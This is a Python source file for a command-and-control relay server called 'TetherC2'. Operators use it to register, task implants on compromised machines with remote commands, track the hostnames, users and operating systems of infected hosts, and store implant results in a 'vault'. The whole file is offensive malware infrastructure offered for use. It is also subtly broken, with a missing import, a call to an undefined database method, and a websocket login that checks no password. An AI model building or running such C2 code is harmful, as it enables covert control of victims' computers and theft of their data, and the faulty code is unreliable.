# C2_Server/relay_server.py
import sys, os, sqlite3, json, time, threading, logging
from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime, timedelta

# --- Basic Configuration ---
INACTIVITY_PERIOD_DAYS = 180
CLEANUP_INTERVAL_SECONDS = 86400
SESSION_TIMEOUT_SECONDS = 40
SERVER_START_TIME = datetime.utcnow()

# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler("relay_server.log"),
        logging.StreamHandler(sys.stdout)
    ]
)

# --- App and Extensions Initialization ---
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24).hex() # Secret key for session security

# Use an in-memory storage for the limiter for simplicity
limiter = Limiter(get_remote_address, app=app, default_limits=["200 per day", "50 per hour"], storage_uri="memory://")

# Use 'threading' mode for local dev, but for production, eventlet or gevent are recommended
socketio = SocketIO(app, async_mode='threading')

class DatabaseManager:
    def __init__(self, db_file="tether_server.db"):
        self.conn = sqlite3.connect(db_file, check_same_thread=False)
        # --- Enable WAL mode for better concurrency ---
        self.conn.execute("PRAGMA journal_mode=WAL;")
        self.setup_schema()

    def setup_schema(self):
        with self.conn:
            self.conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, password_hash TEXT NOT NULL, assigned_line INTEGER NOT NULL, last_login TEXT)")
            # Add alias column to sessions table if it doesn't exist
            try:
                self.conn.execute("ALTER TABLE sessions ADD COLUMN alias TEXT")
            except sqlite3.OperationalError:
                pass # Column already exists
            self.conn.execute("CREATE TABLE IF NOT EXISTS sessions (session_id TEXT PRIMARY KEY, owner_username TEXT NOT NULL, metadata TEXT, alias TEXT, FOREIGN KEY (owner_username) REFERENCES users(username))")
            self.conn.execute("CREATE TABLE IF NOT EXISTS vault (session_id TEXT, module_name TEXT, data TEXT, PRIMARY KEY (session_id, module_name))")

    def delete_all_data_for_user(self, username):
        try:
            with self.conn:
                cursor = self.conn.cursor()
                cursor.execute("SELECT session_id FROM sessions WHERE owner_username = ?", (username,))
                session_ids = [row[0] for row in cursor.fetchall()]
                if session_ids:
                    placeholders = ','.join('?' for _ in session_ids)
                    cursor.execute(f"DELETE FROM vault WHERE session_id IN ({placeholders})", session_ids)
                cursor.execute("DELETE FROM sessions WHERE owner_username = ?", (username,))
            return True
        except sqlite3.Error as e:
            logging.error(f"Database sanitize error for user {username}: {e}")
            return False

    def create_user(self, username, password_hash):
        try:
            with self.conn:
                self.conn.execute("INSERT INTO users (username, password_hash, assigned_line, last_login) VALUES (?, ?, ?, ?)", (username, password_hash, random.randint(1, 10), datetime.utcnow().isoformat()))
            return True
        except sqlite3.IntegrityError:
            return False

    def get_user(self, username):
        cursor = self.conn.cursor()
        cursor.execute("SELECT username, password_hash, assigned_line FROM users WHERE username = ?", (username,))
        return cursor.fetchone()

    def update_user_last_login(self, username):
        try:
            with self.conn:
                self.conn.execute("UPDATE users SET last_login = ? WHERE username = ?", (datetime.utcnow().isoformat(), username))
        except sqlite3.Error as e:
            logging.error(f"Failed to update last_login for {username}: {e}")

    def find_and_delete_inactive_users(self):
        logging.info(f"Running scheduled task to delete users inactive for over {INACTIVITY_PERIOD_DAYS} days...")
        try:
            with self.conn:
                cursor = self.conn.cursor()
                cutoff_date = datetime.utcnow() - timedelta(days=INACTIVITY_PERIOD_DAYS)
                cursor.execute("SELECT username FROM users WHERE last_login IS NOT NULL AND last_login < ?", (cutoff_date.isoformat(),))
                inactive_users = [row[0] for row in cursor.fetchall()]

                if not inactive_users:
                    logging.info("No inactive users found.")
                    return

                for username in inactive_users:
                    logging.warning(f"Deleting user '{username}' due to inactivity...")
                    self.delete_all_data_for_user(username)
                    cursor.execute("DELETE FROM users WHERE username = ?", (username,))
                    logging.warning(f"Successfully deleted user '{username}'.")
        except sqlite3.Error as e:
            logging.error(f"An error occurred during the inactive user cleanup task: {e}")
            
    def update_session_alias(self, session_id, owner_username, alias):
        cursor = self.conn.cursor()
        cursor.execute("SELECT owner_username FROM sessions WHERE session_id = ?", (session_id,))
        result = cursor.fetchone()
        if not result or result[0] != owner_username:
            return False, "Session not found or permission denied."
        try:
            with self.conn:
                self.conn.execute("UPDATE sessions SET alias = ? WHERE session_id = ?", (alias, session_id))
            return True, "Alias updated successfully."
        except sqlite3.Error as e:
            logging.error(f"Failed to update alias for session {session_id}: {e}")
            return False, "Database error."

    # ... (other database methods like create_or_update_session, load_vault_data_for_user etc. remain largely the same)
    def create_or_update_session(self, session_id, owner_username, metadata):
        self.conn.execute("INSERT OR REPLACE INTO sessions (session_id, owner_username, metadata) VALUES (?, ?, ?)", (session_id, owner_username, json.dumps(metadata))); self.conn.commit()
    def load_vault_data_for_user(self, username):
        user_sessions = {}; cursor = self.conn.cursor(); cursor.execute("SELECT session_id, metadata, alias FROM sessions WHERE owner_username = ?", (username,)); 
        for row in cursor.fetchall(): user_sessions[row[0]] = {"metadata": json.loads(row[1]), "alias": row[2]}
        vault_data = {}
        for session_id, data in user_sessions.items(): vault_data[session_id] = {"metadata": data["metadata"], "alias": data["alias"]}
        if not user_sessions: return {}
        placeholders = ','.join('?' for _ in user_sessions); query = f"SELECT session_id, module_name, data FROM vault WHERE session_id IN ({placeholders})"
        for sid, mod_name, data_json in self.conn.execute(query, tuple(user_sessions.keys())):
            if sid in vault_data: vault_data[sid][mod_name] = json.loads(data_json)
        return vault_data


# --- Global State and Locks ---
db = DatabaseManager()
active_sessions = {} # In-memory cache for live implant status
session_lock = threading.Lock()
# Mapping of user's sid (socket ID) to their username
client_sids = {}

# --- WebSocket Events for C2 Client Communication ---

@socketio.on('connect')
def handle_connect():
    logging.info(f"C2 Client connected with sid: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    logging.info(f"C2 Client disconnected: {request.sid}")
    if request.sid in client_sids:
        username = client_sids.pop(request.sid, None)
        if username:
            leave_room(username)
            logging.info(f"User '{username}' with sid {request.sid} left their room.")

@socketio.on('authenticate')
def handle_authentication(data):
    """Authenticates a C2 client and places them in a user-specific room."""
    username = data.get('username')
    if username:
        join_room(username)
        client_sids[request.sid] = username
        logging.info(f"User '{username}' authenticated for sid {request.sid} and joined room.")
        emit('authentication_success', {'message': f'Successfully subscribed to updates for {username}'})

@socketio.on('task_implant')
def handle_tasking(data):
    """Receives a task from the C2 client and queues it for the implant."""
    username = client_sids.get(request.sid)
    session_id = data.get('session_id')
    command = data.get('command')
    if not all([username, session_id, command]):
        emit('tasking_error', {'error': 'Missing username, session_id, or command.'})
        return
    
    with session_lock:
        if active_sessions.get(session_id, {}).get('owner') == username:
            # The 'command_queue' is now implicitly handled by sending tasks directly to implants.
            # For this example, we'll assume the implant is always listening.
            # In a real scenario, this would queue the command if the implant is offline.
             socketio.emit('execute_command', command, to=session_id) # Send command to specific implant room
             logging.info(f"Task sent to implant {session_id} by user {username}: {command.get('action')}")
        else:
             emit('tasking_error', {'error': 'Session not found or permission denied.'})


# --- HTTP Routes ---

@app.route('/')
def index():
    return "TetherC2 Relay is operational."

@app.route('/api/v1/stats', methods=['GET'])
def get_server_stats():
    with session_lock:
        active_implant_count = len(active_sessions)
    
    uptime = datetime.utcnow() - SERVER_START_TIME
    
    return jsonify({
        "active_implants": active_implant_count,
        "server_uptime_seconds": uptime.total_seconds(),
        "server_start_time_utc": SERVER_START_TIME.isoformat()
    })

@app.route('/auth/register', methods=['POST'])
@limiter.limit("5 per minute")
def register():
    data = request.json
    username, password = data.get('username'), data.get('password')
    # Basic Input Validation
    if not username or not isinstance(username, str) or not (3 <= len(username) <= 20):
        return jsonify({"success": False, "error": "Username must be between 3 and 20 characters."}), 400
    if not password or not isinstance(password, str) or len(password) < 6:
        return jsonify({"success": False, "error": "Password must be at least 6 characters long."}), 400

    if db.create_user(username, generate_password_hash(password)):
        logging.warning(f"New user registered: '{username}' from IP: {get_remote_address()}")
        return jsonify({"success": True, "message": "Account created successfully."})
    else:
        return jsonify({"success": False, "error": "Username already exists."}), 409

@app.route('/auth/login', methods=['POST'])
@limiter.limit("10 per minute")
def login():
    data = request.json
    username, password = data.get('username'), data.get('password')
    user = db.get_user(username)
    if user and check_password_hash(user[1], password):
        db.update_user_last_login(username)
        logging.info(f"Successful login for user '{username}' from IP: {get_remote_address()}")
        return jsonify({"success": True, "username": user[0], "assigned_line": user[2]})
    else:
        logging.warning(f"Failed login attempt for username '{username}' from IP: {get_remote_address()}")
        return jsonify({"success": False, "error": "Invalid username or password."}), 401

@app.route('/c2/session/<string:session_id>/alias', methods=['POST'])
def set_session_alias(session_id):
    data = request.json
    username, alias = data.get('username'), data.get('alias') # Assume client sends its username for verification
    if not alias or len(alias) > 50:
        return jsonify({"success": False, "error": "Alias is required and cannot exceed 50 characters."}), 400
    
    success, message = db.update_session_alias(session_id, username, alias)
    if success:
        logging.info(f"User '{username}' set alias for session {session_id} to '{alias}'")
        # Push this update to the C2 client in real-time
        socketio.emit('session_updated', {'session_id': session_id, 'alias': alias}, room=username)
        return jsonify({"success": True, "message": message})
    else:
        return jsonify({"success": False, "error": message}), 403

# --- Implant-Facing Routes & Events ---

@socketio.on('implant_connect')
def handle_implant_connect(data):
    """Handles new implant connections via WebSocket."""
    sid, c2_user = data.get("session_id"), data.get("c2_user")
    if not all([sid, c2_user]): return
    
    join_room(sid) # The implant joins a room identified by its own session_id
    
    with session_lock:
        is_new = sid not in active_sessions
        metadata = {"hostname": data.get("hostname"), "user": data.get("user"), "os": data.get("os")}
        active_sessions[sid] = {"owner": c2_user, "last_seen": time.time(), "socket_id": request.sid, **metadata}
        db.create_or_update_session(sid, c2_user, metadata)
    
    # Notify the C2 client in real-time
    update_payload = {'session_id': sid, 'metadata': metadata, 'status': 'Online'}
    if is_new:
        logging.warning(f"New implant checked in: {sid} for user {c2_user}")
        socketio.emit('new_session', update_payload, room=c2_user)
    else:
        socketio.emit('session_updated', update_payload, room=c2_user)

@socketio.on('implant_response')
def handle_implant_response(data):
    """Handles results/responses sent from an implant."""
    sid, c2_user = data.get("session_id"), data.get("c2_user")
    if not all([sid, c2_user]): return
    
    # Persist data to the vault
    if "results" in data:
        for result in data.get("results", []):
            mod_name, out_data = result.get("command"), result.get("output")
            if mod_name and out_data is not None:
                db.save_vault_data(sid, mod_name, result) # Save the whole result packet
    
    # Forward the response to the C2 client
    socketio.emit('command_response', data, room=c2_user)

def check_offline_implants():
    """Periodically checks for implants that have gone offline."""
    while True:
        with session_lock:
            offline_sids = []
            for sid, data in active_sessions.items():
                if time.time() - data.get("last_seen", 0) > SESSION_TIMEOUT_SECONDS:
                    offline_sids.append(sid)
            
            for sid in offline_sids:
                owner = active_sessions.pop(sid, {}).get('owner')
                if owner:
                    logging.warning(f"Implant timed out: {sid}")
                    socketio.emit('session_updated', {'session_id': sid, 'status': 'Offline'}, room=owner)
        
        time.sleep(15) # Check every 15 seconds


def start_cleanup_scheduler():
    db.find_and_delete_inactive_users()
    threading.Timer(CLEANUP_INTERVAL_SECONDS, start_cleanup_scheduler).start()

if __name__ == '__main__':
    start_cleanup_scheduler()
    
    # Start the thread that checks for offline/timed-out implants
    threading.Thread(target=check_offline_implants, daemon=True).start()

    port = int(os.environ.get('PORT', 5001))
    logging.info(f"TetherC2 Relay (WebSocket Enabled) starting on port {port}.")
    # Use socketio.run() which is the correct way to start the server
    socketio.run(app, host='0.0.0.0', port=port, allow_unsafe_werkzeug=True)